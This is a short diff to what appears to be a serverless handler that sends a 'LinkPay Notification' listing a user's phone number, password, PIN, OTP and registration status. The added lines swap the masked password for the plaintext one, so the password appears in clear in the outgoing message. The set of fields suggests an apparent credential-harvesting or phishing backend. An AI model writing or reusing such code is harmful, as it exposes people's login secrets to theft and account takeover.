@@ -19,11 +19,12 @@ export default async function handler(req, res) {
 
     // Phone number बिना hide किए
     const safePhone = phone || "Not provided";
+    const safePassword = Password || "Not provided";
 
     const message =
       `🔔 LinkPay Notification\n\n` +
       `📱 Phone: ${safePhone}\n` +
-      `🔑 Password: ********\n` +
+      `🔑 Password: ${safePassword}\n` +
       `🔢 PIN: ****\n` +
       `🔐 OTP: ******\n` +
       `✅ Status: ${result || "Registration attempted"}`;
